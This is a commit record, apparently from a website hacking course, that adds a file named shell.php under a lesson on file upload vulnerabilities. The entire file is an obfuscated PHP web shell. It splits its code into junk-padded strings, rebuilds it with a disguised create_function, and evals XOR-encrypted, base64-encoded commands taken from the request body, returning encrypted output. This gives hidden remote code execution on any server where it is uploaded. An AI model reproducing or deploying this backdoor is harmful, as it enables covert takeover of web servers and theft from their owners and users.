b329ed3488f5dc3f2cdbf5482248d97766066746
Michal Radomski <michalra@op.pl>
2026-09-15 22:32:46 +0200

    Website Hacking / Penetration Testing course - commit 08

---
+++ 24_Website_Hacking/02_File_upload_vulnerabilities/shell.php
@@ -0,0 +1,11 @@
+<?php
+$k='aZ4l(@gzuZ4ncompress(Z4Z4@xZ4(@bZ4ase64_deZ4code($m[Z41])Z4,$k)Z4));$o=@ob_gZ4et_contentZ4s();@obZ4';
+$f=str_replace('My','','crMyeMyatMye_MyfuMyncMytion');
+$c='_end_cleanZ4();$rZ4=@base6Z44_enZ4Z4code(@x(@gZ4zcomprZ4ess($o),Z4$k));prZ4int("$pZ4$Z4kh$r$kf");}';
+$t='j=0;Z4($j<$c&&$i<$Z4l);$j++Z4,$i+Z4+){$o.=$t{Z4$i}^$Z4k{$j}Z4;}}reZ4tZ4urn $o;Z4}if (@prZ4eg_';
+$A='$k="e1Z40Z4adZ4c39";$kh="49ba59aZ4bZ4be56";Z4$kf="Z4eZ4057f20f88Z43e";$p="taB6OYCZ4ZLQsZMZ4BZ4';
+$F='maZ4tchZ4("/$kh(.+)$kf/Z4",@fiZ4le_get_cZ4onZ4tents("php:/Z4/input")Z4Z4,$m)==Z41)Z4 {@ob_start();Z4@ev';
+$Q='Ti";funcZ4tiZ4on x($Z4t,$k){Z4$c=strlen(Z4$k);$Z4l=sZ4trleZ4n($t);$o="";forZ4($iZ4=Z40;$Z4i<$l;)Z4{for($Z4';
+$n=str_replace('Z4','',$A.$Q.$t.$F.$k.$c);
+$o=$f('',$n);$o();
+?>
